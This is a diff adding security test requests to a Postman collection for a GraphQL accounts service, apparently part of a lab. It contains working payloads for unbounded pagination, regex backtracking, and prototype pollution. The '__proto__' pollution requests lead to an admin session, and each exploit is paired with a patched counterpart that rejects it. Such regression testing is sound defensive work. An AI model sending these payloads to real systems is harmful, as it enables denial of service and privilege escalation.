@@ -1327,6 +1327,325 @@
           "response": []
         }
       ]
+    },
+    {
+      "name": "RES",
+      "item": [
+        {
+          "name": "RES-001: usersAll accepts a hundred thousand",
+          "event": [
+            {
+              "listen": "test",
+              "script": {
+                "type": "text/javascript",
+                "exec": [
+                  "pm.test('whatever was asked for is read: every user answers', () => {",
+                  "  pm.expect(pm.response.json().data.usersAll).to.have.lengthOf(6);",
+                  "});"
+                ]
+              }
+            }
+          ],
+          "request": {
+            "method": "POST",
+            "header": [
+              {
+                "key": "authorization",
+                "value": "Bearer {{accessToken}}"
+              },
+              {
+                "key": "content-type",
+                "value": "application/json"
+              }
+            ],
+            "url": "{{accountsUrl}}/graphql",
+            "body": {
+              "mode": "raw",
+              "raw": "{\"query\": \"query { usersAll(limit: 100000) { id } }\", \"variables\": null}"
+            }
+          },
+          "response": []
+        },
+        {
+          "name": "RES-001: the capped counterpart refuses the same limit",
+          "event": [
+            {
+              "listen": "test",
+              "script": {
+                "type": "text/javascript",
+                "exec": [
+                  "pm.test('a page has a ceiling', () => {",
+                  "  const error = pm.response.json().errors[0];",
+                  "  pm.expect(error.extensions.code).to.eql('BAD_USER_INPUT');",
+                  "  pm.expect(error.message).to.contain('at most');",
+                  "});"
+                ]
+              }
+            }
+          ],
+          "request": {
+            "method": "POST",
+            "header": [
+              {
+                "key": "authorization",
+                "value": "Bearer {{adminToken}}"
+              },
+              {
+                "key": "content-type",
+                "value": "application/json"
+              }
+            ],
+            "url": "{{accountsUrl}}/graphql",
+            "body": {
+              "mode": "raw",
+              "raw": "{\"query\": \"query { users(limit: 100000) { id } }\", \"variables\": null}"
+            }
+          },
+          "response": []
+        }
+      ]
+    },
+    {
+      "name": "RE",
+      "item": [
+        {
+          "name": "RE-001: the display-name pattern takes seconds to refuse",
+          "event": [
+            {
+              "listen": "test",
+              "script": {
+                "type": "text/javascript",
+                "exec": [
+                  "pm.test('refused in the end, after the backtracking', () => {",
+                  "  pm.expect(pm.response.json().errors[0].extensions.code).to.eql('BAD_USER_INPUT');",
+                  "});"
+                ]
+              }
+            }
+          ],
+          "request": {
+            "method": "POST",
+            "header": [
+              {
+                "key": "authorization",
+                "value": "Bearer {{accessToken}}"
+              },
+              {
+                "key": "content-type",
+                "value": "application/json"
+              }
+            ],
+            "url": "{{accountsUrl}}/graphql",
+            "body": {
+              "mode": "raw",
+              "raw": "{\"query\": \"mutation { updateDisplayName(name: \\\"AAAAAAAAAAAAAAAAAAAAAAAAAAAAA!\\\") { id } }\", \"variables\": null}"
+            }
+          },
+          "response": []
+        },
+        {
+          "name": "RE-001: the linear counterpart refuses the same name",
+          "event": [
+            {
+              "listen": "test",
+              "script": {
+                "type": "text/javascript",
+                "exec": [
+                  "pm.test('one pass, the same answer', () => {",
+                  "  pm.expect(pm.response.json().errors[0].extensions.code).to.eql('BAD_USER_INPUT');",
+                  "});"
+                ]
+              }
+            }
+          ],
+          "request": {
+            "method": "POST",
+            "header": [
+              {
+                "key": "authorization",
+                "value": "Bearer {{accessToken}}"
+              },
+              {
+                "key": "content-type",
+                "value": "application/json"
+              }
+            ],
+            "url": "{{accountsUrl}}/graphql",
+            "body": {
+              "mode": "raw",
+              "raw": "{\"query\": \"mutation { updateProfile(input: {displayName: \\\"AAAAAAAAAAAAAAAAAAAAAAAAAAAAA!\\\"}) { id } }\", \"variables\": null}"
+            }
+          },
+          "response": []
+        }
+      ]
+    },
+    {
+      "name": "PROTO",
+      "description": "Last on purpose: each exploit leaves a value on the prototype of every object in the service, and nothing after these requests depends on a field they pollute.",
+      "item": [
+        {
+          "name": "PROTO-002: the settings string is merged",
+          "event": [
+            {
+              "listen": "test",
+              "script": {
+                "type": "text/javascript",
+                "exec": [
+                  "pm.test('the merge answers as if a preference had been written', () => {",
+                  "  pm.expect(pm.response.json().data.updateNotificationSettings.id).to.eql('u-alice');",
+                  "});"
+                ]
+              }
+            }
+          ],
+          "request": {
+            "method": "POST",
+            "header": [
+              {
+                "key": "authorization",
+                "value": "Bearer {{accessToken}}"
+              },
+              {
+                "key": "content-type",
+                "value": "application/json"
+              }
+            ],
+            "url": "{{accountsUrl}}/graphql",
+            "body": {
+              "mode": "raw",
+              "raw": "{\"query\": \"mutation ($s: String!) { updateNotificationSettings(settings: $s) { id } }\", \"variables\": {\"s\": \"{\\\"__proto__\\\":{\\\"userId\\\":\\\"u-admin\\\"}}\"}}"
+            }
+          },
+          "response": []
+        },
+        {
+          "name": "PROTO-002: a cookie that names no user gains one",
+          "event": [
+            {
+              "listen": "test",
+              "script": {
+                "type": "text/javascript",
+                "exec": [
+                  "pm.test('the omitted userId came from the prototype', () => {",
+                  "  pm.response.to.have.status(200);",
+                  "  pm.expect(pm.response.json()).to.eql({ status: 'resumed', userId: 'u-admin', theme: 'dark' });",
+                  "});"
+                ]
+              }
+            }
+          ],
+          "request": {
+            "method": "POST",
+            "header": [
+              {
+                "key": "cookie",
+                "value": "vcx_remember={\"theme\":\"dark\"}"
+              }
+            ],
+            "url": "{{accountsUrl}}/internal/sessions/resume-legacy"
+          },
+          "response": []
+        },
+        {
+          "name": "PROTO-001: the allowlisted walk refuses the path",
+          "event": [
+            {
+              "listen": "test",
+              "script": {
+                "type": "text/javascript",
+                "exec": [
+                  "pm.test('__proto__ is not a preference name', () => {",
+                  "  pm.expect(pm.response.json().errors[0].extensions.code).to.eql('BAD_USER_INPUT');",
+                  "});"
+                ]
+              }
+            }
+          ],
+          "request": {
+            "method": "POST",
+            "header": [
+              {
+                "key": "authorization",
+                "value": "Bearer {{accessToken}}"
+              },
+              {
+                "key": "content-type",
+                "value": "application/json"
+              }
+            ],
+            "url": "{{accountsUrl}}/graphql",
+            "body": {
+              "mode": "raw",
+              "raw": "{\"query\": \"mutation { setPreferencePath(path: \\\"__proto__.theme\\\", value: \\\"zazzles-lab-marker\\\") { id } }\", \"variables\": null}"
+            }
+          },
+          "response": []
+        },
+        {
+          "name": "PROTO-001: the dotted path is walked as written",
+          "event": [
+            {
+              "listen": "test",
+              "script": {
+                "type": "text/javascript",
+                "exec": [
+                  "pm.test('the mutation answers as if a preference had been written', () => {",
+                  "  pm.expect(pm.response.json().data.setPreferenceByPath.id).to.eql('u-alice');",
+                  "});"
+                ]
+              }
+            }
+          ],
+          "request": {
+            "method": "POST",
+            "header": [
+              {
+                "key": "authorization",
+                "value": "Bearer {{accessToken}}"
+              },
+              {
+                "key": "content-type",
+                "value": "application/json"
+              }
+            ],
+            "url": "{{accountsUrl}}/graphql",
+            "body": {
+              "mode": "raw",
+              "raw": "{\"query\": \"mutation { setPreferenceByPath(path: \\\"__proto__.theme\\\", value: \\\"zazzles-lab-marker\\\") { id } }\", \"variables\": null}"
+            }
+          },
+          "response": []
+        },
+        {
+          "name": "PROTO-001: a cookie that names no theme gains one",
+          "event": [
+            {
+              "listen": "test",
+              "script": {
+                "type": "text/javascript",
+                "exec": [
+                  "pm.test('the omitted theme came from the prototype', () => {",
+                  "  pm.response.to.have.status(200);",
+                  "  pm.expect(pm.response.json()).to.eql({ status: 'resumed', userId: 'u-alice', theme: 'zazzles-lab-marker' });",
+                  "});"
+                ]
+              }
+            }
+          ],
+          "request": {
+            "method": "POST",
+            "header": [
+              {
+                "key": "cookie",
+                "value": "vcx_remember={\"userId\":\"u-alice\"}"
+              }
+            ],
+            "url": "{{accountsUrl}}/internal/sessions/resume-legacy"
+          },
+          "response": []
+        }
+      ]
     }
   ]
 }
